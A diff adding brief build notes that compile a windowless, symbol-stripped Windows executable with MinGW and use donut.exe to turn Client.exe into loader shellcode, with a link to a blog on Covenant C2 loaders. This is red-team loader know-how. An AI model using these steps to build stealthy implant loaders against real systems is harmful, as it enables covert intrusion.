@@ -1,0 +1,9 @@
+"C:\Program Files\CodeBlocks\MinGW\bin\windres" resource.rc -o resource.o 
+
+"C:\Program Files\CodeBlocks\MinGW\bin\x86_64-w64-mingw32-g++" main.cpp resource.o -o app.exe -mwindows -s -ffunction-sections -fdata-sections -Wl,--gc-sections
+
+donut.exe -a 2 -f 1 -o loader.bin -i Client.exe
+
+
+
+https://blog.sunggwanchoi.com/covenant-loaders-and-winapi/
